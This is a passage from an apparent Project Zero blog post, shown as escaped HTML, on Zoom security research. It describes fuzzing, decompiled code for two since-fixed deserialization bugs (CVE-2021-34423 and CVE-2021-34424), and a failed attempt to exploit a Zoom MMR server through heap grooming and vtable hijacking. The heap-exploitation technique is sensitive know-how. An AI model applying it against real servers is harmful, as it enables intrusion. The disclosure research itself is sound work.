class=\"c81\" href=\"https://frida.re/\"&gt;Frida&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c2\"&gt;. The output contained many XMPP stanzas (messages) as well as other network traffic, which I analyzed to determine how XMPP is used by Zoom. XMPP is used for most communication between Zoom clients outside of meetings, such as messages and channels, and is also used for signaling (call set-up) when a Zoom Contact invites another Zoom Contact to a meeting.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c2\"&gt;I spent some time going through the client binary trying to determine how the client processes XMPP, for example, if a stanza contains a text message, how is that message extracted and displayed in the client. Even though the Zoom client contains many log strings, this was challenging, and I eventually asked my teammate Ned Williamson for help locating symbols for the client. He discovered that several old versions of the Android Zoom SDK contained symbols. While these versions are roughly five years old, and do not present a complete view of the client as they only include some libraries that it uses, they were immensely helpful in understanding how Zoom uses XMPP.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;Application-defined tags can be added to gloox&amp;rsquo;s XMPP parser by extending the class &lt;/span&gt;&lt;span class=\"c6\"&gt;StanzaExtension&lt;/span&gt;&lt;span&gt;&amp;nbsp;and implementing the method &lt;/span&gt;&lt;span class=\"c6\"&gt;newInstance&lt;/span&gt;&lt;span&gt;&amp;nbsp;to define how the tag is converted into a C++ object. Parsed XMPP stanzas are then processed using the &lt;/span&gt;&lt;span class=\"c6\"&gt;MessageHandler&lt;/span&gt;&lt;span&gt;&amp;nbsp;class. Application developers extend this class, implementing the method &lt;/span&gt;&lt;span class=\"c6\"&gt;handleMessage&lt;/span&gt;&lt;span&gt;&amp;nbsp;with code that performs application functionality based on the contents of the stanza received. Zoom implements its XMPP handling in &lt;/span&gt;&lt;span class=\"c6\"&gt;CXmppIMSession::handleMessage&lt;/span&gt;&lt;span&gt;, which is a large function that is an entrypoint to most messaging and calling features. The final processing stage of many XMPP tags is in the class &lt;/span&gt;&lt;span class=\"c6\"&gt;ns_zoom_messager::CZoomMMXmppWrapper&lt;/span&gt;&lt;span&gt;, which contains many methods starting with &amp;lsquo;On&amp;rsquo; that handle specific events. I spent a fair amount of time analyzing these code paths, but didn&amp;rsquo;t find any bugs. Interestingly, Thijs Alkemade and Daan Keuper released a &lt;/span&gt;&lt;span class=\"c17\"&gt;&lt;a class=\"c81\" href=\"https://sector7.computest.nl/post/2021-08-zoom/\"&gt;write-up&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;of their Pwn2Own bug after I completed this research, and it involved a vulnerability in this area.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c13\" id=\"h.xi3fsuloyufo\"&gt;&lt;span&gt;RTP Processing&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;Afterwards, I investigated how Zoom clients process audio and video content. Like all other video conferencing systems that I have analyzed, it uses Real-time Transport Protocol (RTP) to transport this data. Based on log strings included in the Linux client binary, Zoom appears to use a branch of WebRTC for audio. Since I have looked at this library a great deal in &lt;/span&gt;&lt;span class=\"c17\"&gt;&lt;a class=\"c81\" href=\"https://googleprojectzero.blogspot.com/2018/12/adventures-in-video-conferencing-part-1.html\"&gt;previous&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c17\"&gt;&lt;a class=\"c81\" href=\"https://googleprojectzero.blogspot.com/2020/08/exploiting-android-messengers-part-1.html\"&gt;posts&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c2\"&gt;, I did not investigate it further. For video, Zoom implements its own RTP processing and uses a custom underlying codec named Zealot (libzlt).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c2\"&gt;Analyzing the Linux client in IDA, I found what I believed to be the video RTP entrypoint, and fuzzed it using afl-qemu. This resulted in several crashes, mostly in RTP extension processing. I tried modifying the RTP sent by a client to reproduce these bugs, but it was not received by the device on the other side and I suspected the server was filtering it. I tried to get around this by enabling end-to-end encryption, but Zoom does not encrypt RTP headers, only the contents of RTP packets (as is typical of most RTP implementations).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;Curious about how Zoom server filtering works, I decided to set up &lt;/span&gt;&lt;span class=\"c17\"&gt;&lt;a class=\"c81\" href=\"https://support.zoom.us/hc/en-us/articles/360034064852-Zoom-On-Premise-Deployment\"&gt;Zoom On-Premises Deployment&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c2\"&gt;. This is a Zoom product that allows customers to set up on-site servers to process their organization&amp;rsquo;s Zoom calls. This required a fair amount of configuration, and I ended up reaching out to the Zoom Security Team for assistance. They helped me get it working, and I greatly appreciate their contribution to this research.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;Zoom On-Premises Deployments consist of two hosts: the controller and the Multimedia Router (MMR)&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;Analyzing the traffic to each server, it became clear that the MMR is the host that transmits audio and video content between Zoom clients. Loading the code for the MMR process into IDA, I located where RTP is processed, and it indeed parses the extensions as a part of its forwarding logic and verifies them correctly, dropping any RTP packets that are malformed.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;The code that processes RTP on the MMR appeared different than the code that I fuzzed on the device, so I set up fuzzing on the server code as well. This was challenging, as the code was in the MMR binary, which was not compiled as a relocatable binary (more on this later). This meant that I couldn&amp;rsquo;t load it as a library and call into specific offsets in the binary as I usually do to fuzz binaries that don&amp;rsquo;t have source code available. Instead, I compiled my own fuzzing stub that called the function I wanted to fuzz as a relocatable that defined &lt;/span&gt;&lt;span class=\"c6\"&gt;fopen&lt;/span&gt;&lt;span&gt;, and loaded it using &lt;/span&gt;&lt;span class=\"c6\"&gt;LD_PRELOAD&lt;/span&gt;&lt;span&gt;&amp;nbsp;when executing the MMR binary. Then my code would take control of execution the first time that the MMR binary called &lt;/span&gt;&lt;span class=\"c6\"&gt;fopen&lt;/span&gt;&lt;span class=\"c2\"&gt;, and was able to call the function being fuzzed.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;This approach has a lot of downsides, the biggest being that the fuzzing stub can&amp;rsquo;t accept command line parameters, execution is fairly slow and a lot of fuzzing tools don&amp;rsquo;t honor &lt;/span&gt;&lt;span class=\"c6\"&gt;LD_PRELOAD&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the target. That said, I was able to fuzz with code coverage using Mateusz Jurczyk&amp;rsquo;s excellent &lt;/span&gt;&lt;span class=\"c17\"&gt;&lt;a class=\"c81\" href=\"https://github.com/googleprojectzero/DrSancov\"&gt;DrSanCov&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c2\"&gt;, with no results.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c13\" id=\"h.89pbrd4mybwj\"&gt;&lt;span class=\"c10\"&gt;Packet Processing&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;When analyzing RTP traffic, I noticed that both Zoom clients and the MMR server process a great deal of packets that didn&amp;rsquo;t appear to be RTP or XMPP. Looking at the SDK with symbols, one library appeared to do a lot of serialization: libssb_sdk.so. This library contains a great deal of classes with the methods &lt;/span&gt;&lt;span class=\"c6\"&gt;load_from&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c6\"&gt;save_to &lt;/span&gt;&lt;span class=\"c2\"&gt;defined with identical declarations, so it is likely that they all implement the same virtual class.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;One parameter to the &lt;/span&gt;&lt;span class=\"c6\"&gt;load_from&lt;/span&gt;&lt;span&gt;&amp;nbsp;methods is an object of class &lt;/span&gt;&lt;span class=\"c6\"&gt;msg_db_t&lt;/span&gt;&lt;span&gt;, &amp;nbsp;which implements a buffer that supports reading different data types. Deserialization is performed by &lt;/span&gt;&lt;span class=\"c6\"&gt;load_from&lt;/span&gt;&lt;span&gt;&amp;nbsp;methods by reading needed data from the &lt;/span&gt;&lt;span class=\"c6\"&gt;msg_db_t&lt;/span&gt;&lt;span&gt;&amp;nbsp;object, and serialization is performed by &lt;/span&gt;&lt;span class=\"c6\"&gt;save_to&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;methods by writing to it.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;After hooking a few &lt;/span&gt;&lt;span class=\"c6\"&gt;save_to&lt;/span&gt;&lt;span&gt;&amp;nbsp;methods with Frida and comparing the written output to data sent with &lt;/span&gt;&lt;span class=\"c6\"&gt;SSL_write&lt;/span&gt;&lt;span&gt;, it became clear that these serialization classes are part of the remote attack surface of Zoom. Reviewing each &lt;/span&gt;&lt;span class=\"c6\"&gt;load_from&lt;/span&gt;&lt;span&gt;&amp;nbsp;method, several contained code similar to the following (from&lt;/span&gt;&lt;span class=\"c6\"&gt;&amp;nbsp;ssb::conf_send_msg_req::load_from&lt;/span&gt;&lt;span class=\"c2\"&gt;).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;ssb::i_stream_t&amp;lt;ssb::msg_db_t,ssb::bytes_convertor&amp;gt;::operator&amp;gt;&amp;gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1 c19 c5\"&gt;&lt;span class=\"c3\"&gt;msg_db, &amp;amp;this-&amp;gt;str_len, consume_bytes, error_out);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; str_len = this-&amp;gt;str_len;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; if ( str_len )&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; mem = operator new[](str_len);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; out_len = 0;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; this-&amp;gt;str_mem = mem;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; ssb::i_stream_t&amp;lt;ssb::msg_db_t,ssb::bytes_convertor&amp;gt;::&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1 c5 c19\"&gt;&lt;span class=\"c3\"&gt;read_str_with_len(msg_db, mem, &amp;amp;out_len);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;read_str_with_len &lt;/span&gt;&lt;span&gt;i&lt;/span&gt;&lt;span class=\"c2\"&gt;s defined as follows.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;int __fastcall ssb::i_stream_t&amp;lt;ssb::msg_db_t,ssb::bytes_convertor&amp;gt;::&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1 c5\"&gt;&lt;span class=\"c3\"&gt;read_str_with_len(msg_db_t* msg, signed __int8 *mem,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1 c5\"&gt;&lt;span class=\"c3\"&gt;unsigned int *len)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; if ( !msg-&amp;gt;invalid )&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1 c5\"&gt;&lt;span class=\"c3\"&gt;ssb::i_stream_t&amp;lt;ssb::msg_db_t,ssb::bytes_convertor&amp;gt;::operator&amp;gt;&amp;gt;(msg, len, (int)len, 0);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; if ( !msg-&amp;gt;invalid )&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; if ( *len )&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ssb::i_stream_t&amp;lt;ssb::msg_db_t,ssb::bytes_convertor&amp;gt;::&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;read(msg, mem, *len, 0);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; }&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; return msg;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;Note that the string buffer is allocated based on a length read from the &lt;/span&gt;&lt;span class=\"c6\"&gt;msg_db_t &lt;/span&gt;&lt;span&gt;buffer, but then a second length is read from the buffer and used as the length of the string that is read. This means that if an attacker could manipulate the contents of the &lt;/span&gt;&lt;span class=\"c6\"&gt;msg_db_t &lt;/span&gt;&lt;span class=\"c2\"&gt;buffer, they could specify the length of the buffer allocated, and overwrite it with any length of data (up to a limit of 0x1FFF bytes, not shown in the code snippet above). &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;I tested this bug by hooking &lt;/span&gt;&lt;span class=\"c6\"&gt;SSL_write&lt;/span&gt;&lt;span&gt;&amp;nbsp;with Frida, and sending the malformed packet, and it caused the Zoom client to crash on a variety of platforms. This vulnerability was assigned &lt;/span&gt;&lt;span class=\"c17 c20\"&gt;&lt;a class=\"c81\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2223\"&gt;CVE-2021-34423&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c7\"&gt;&amp;nbsp;and fixed on November 24, 2021.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c11\"&gt;Looking at the code for the MMR server, I noticed that &lt;/span&gt;&lt;span class=\"c6\"&gt;ssb::conf_send_msg_req::load_from&lt;/span&gt;&lt;span class=\"c2\"&gt;, the class the vulnerability occurs in was also present on the MMR server. Since the MMR forwards Zoom meeting traffic from one client to another, it makes sense that it might also deserialize this packet type. I analyzed the MMR code in IDA, and found that deserialization of this class only occurs during Zoom Webinars. I purchased a Zoom Webinar license, and was able to crash my own Zoom MMR server by sending this packet. I was not willing to test a vulnerability of this type on Zoom&amp;rsquo;s public MMR servers, but it seems reasonably likely that the same code was also in Zoom&amp;rsquo;s public servers.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;Looking further at deserialization, I noticed that all deserialized objects contain an optional field of type &lt;/span&gt;&lt;span class=\"c6\"&gt;ssb::dyna_para_table_t&lt;/span&gt;&lt;span&gt;, which is basically a properties table that allows a map of name strings to variant objects to be included in the deserialized object. The variants in the table are implemented by the structure &lt;/span&gt;&lt;span class=\"c6\"&gt;ssb::variant_t&lt;/span&gt;&lt;span class=\"c2\"&gt;, as follows.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;struct variant{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1 c5\"&gt;&lt;span class=\"c3\"&gt;char type;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1 c5\"&gt;&lt;span class=\"c3\"&gt;short length;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1 c5\"&gt;&lt;span class=\"c3\"&gt;var_data data;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;union var_data{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;char i8;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;char* i8_ptr;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;short i16;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;short* i16_ptr;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;int i32;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;int* i32_ptr;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;long long i64;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;long long i64*;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c2\"&gt;The value of the type field corresponds to the width of the variant data (1 for 8-bit, 2 for 16-bit, 3 for 32-bit and 4 four 64-bit). The length field specifies whether the variant is an array and its length. If it has the value 0, the variant is not an array, and a numeric value is read from the data field based on its type. If the length field has any other value, the data field is cast to a pointer, an array of that size is read.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c2\"&gt;My immediate concern with this implementation was that it could be prone to type confusion. One possibility is that a numeric value could be confused with an array pointer, which would allow an attacker to create a variant with a pointer that they specify. However, both the client and MMR perform very aggressive type checks on variants they treat as arrays. Another possibility is that a pointer could be confused with a numeric value. This could allow an attacker to determine the address of a buffer they control if the value is ever returned to the attacker. I found a few locations in the MMR code where a pointer is converted to a numeric value in this way and logged, but nowhere that an attacker could obtain the incorrectly cast value. Finally, I looked at how array data is handled, and I found that there are several locations where byte array variants are converted to strings, however not all of them checked that the byte array has a null terminator. This meant that if these variants were converted to strings, the string could contain the contents of uninitialized memory.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;Most of the time, packets sent to the MMR by one user are immediately forwarded to other users without being deserialized by the server. For some bugs, this is a useful feature, for example, it is what allows CVE-2021-34423 discussed earlier to be triggered on a client. However, an information leak in variants needs to occur on the server to be useful to an attacker. When a client deserializes an incoming packet, it is for use on the device, so even if a deserialized string contains sensitive information, it is unlikely that this information will be transmitted off the device. Meanwhile, the MMR exists expressly to transmit information from one user to another, so if a string gets deserialized, there is a reasonable chance that it gets sent to another user, or alters server behavior in an observable way. So, I tried to find a way to get the server to deserialize a variant and convert it to a string. I eventually figured out that when a user logs into Zoom in a browser, the browser can&amp;rsquo;t process serialized packets, so the MMR must convert them to strings so they can be accessed through web requests. Indeed, I found that if I removed the null terminator from the &lt;/span&gt;&lt;span class=\"c6\"&gt;user_name&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;variant, it would be converted to a string and sent to the browser as the user&amp;rsquo;s display name.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;The vulnerability was assigned &lt;/span&gt;&lt;span class=\"c17\"&gt;&lt;a class=\"c81\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2235&amp;q=zoom%5C&amp;can=1\"&gt;CVE-2021-34424&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;and fixed on November 24, 2021. I tested it on my own MMR as well as Zoom&amp;rsquo;s public MMR, and it worked and returned pointer data in both cases.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c13\" id=\"h.mbswjzdihcwb\"&gt;&lt;span&gt;Exploit Attempt&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;I attempted to exploit my local MMR server with these vulnerabilities, and while I had success with portions of the exploit, &lt;/span&gt;&lt;span&gt;I was not able to get it working&lt;/span&gt;&lt;span class=\"c2\"&gt;. I started off by investigating the possibility of creating a client that could trigger each bug outside of the Zoom client, but client authentication appeared complex and I lacked symbols for this part of the code, so I didn&amp;rsquo;t pursue this as I suspected it would be very time-consuming. Instead, I analyzed the exploitability of the bugs by triggering them from a Linux Zoom client hooked with Frida.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;I started off by investigating the impact of heap corruption on the MMR process. MMR servers run on CentOS 7, which uses a modern glibc heap, so exploiting heap unlinking did not seem promising. I &lt;/span&gt;&lt;span&gt;looked into overwriting the vtable of a C++ object allocated on the heap instead.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;I wrote several Frida scripts that hooked malloc on the server, and used them to monitor how incoming traffic affects allocation. It turned out that there are not many ways for an attacker to control memory allocation on an MMR server that are useful for exploiting this vulnerability. &lt;/span&gt;&lt;span&gt;There are several packet types that an attacker can send to the server that cause memory to be allocated on the heap and then freed when processing is finished, but not as many where the attacker can trigger both allocation and freeing.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Moreover, the MMR server performs different types of processing in separate threads that use unique heap arenas, so many areas of the code where this type of allocation is likely to occur, such as connection management, allocate memory in a different heap arena than the thread where the bug occurs. The only such allocations I could find that were made in the same arena were related to meeting set-up: when a user joins a meeting, certain objects are allocated on the heap, which are then freed when they leave the meeting. &lt;/span&gt;&lt;span&gt;Unfortunately, these allocations are difficult to automate as they require many unique users accounts in order for the allocation to be performed repeatedly, and allocation takes an observable amount of time (seconds).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c2\"&gt;I eventually wrote Frida scripts that looked for free chunks of unusual sizes that bordered C++ objects with vtables during normal MMR operation. There were a few allocation sizes that met this criteria, and since CVE-2021-34423 allows for the size of the buffer that is overflowed to be specified by the attacker, I was able to corrupt the memory of the adjacent object. Unfortunately, heap verification was very robust, so in most cases, the MMR process would crash due to a heap verification error before a virtual call was made on the corrupted object. I eventually got around this by focusing on allocation sizes that are small enough to be stored in fastbins by the heap, as heap chunks that are stored in fastbins do not contain verifiable heap metadata. Chunks of size 58 turned out to be the best choice, and by triggering the bug with an allocation of that size, I was able to control the pointer of a virtual call about one in ten times I triggered the bug.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;The next step was to figure out where to point the pointer I could control, and this turned out to be more challenging than I expected. The MMR process did not have ASLR enabled when I did this research (it was enabled in version 4.6.20211128.136, which was released on November 28, 2021), so I was hoping to find a series of locations in the binary that this call could be directed to that would eventually end in a call to &lt;/span&gt;&lt;span class=\"c6\"&gt;execv&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;with controllable parameters, as the MMR initialization code contains many calls to this function. However, there were a few features of the server that made this difficult. First, only the MMR binary was loaded at a fixed location. The heap and system libraries were not, so only the actual MMR code was available without bypassing ASLR. Second, if the MMR crashes, it has an exponential backoff which culminates in it respawning every hour on the hour. This limits how many exploit attempts an attacker has. It is realistic that an attacker might spend days or even weeks trying to exploit a server, but this still limits them to hundreds of attempts. This means that any exploit of an MMR server would need to be at least somewhat reliable, so certain techniques that require a lot of attempts, such as allocating a large buffer on the heap and trying to guess its location were not practical.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;I eventually decided that it would be helpful to allocate a buffer on the heap with controlled contents and determine its location. This would make the exploit fairly reliable in the case that the &lt;/span&gt;&lt;span&gt;overfl&lt;/span&gt;&lt;span&gt;ow successfully leads to a virtual call, as the buffer could be used as a fake vtable, and also contain strings that could be used as parameters to &lt;/span&gt;&lt;span class=\"c6\"&gt;execv&lt;/span&gt;&lt;span class=\"c2\"&gt;. I tried using CVE-2021-34424 to leak such an address, but wasn&amp;rsquo;t able to get this working. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span 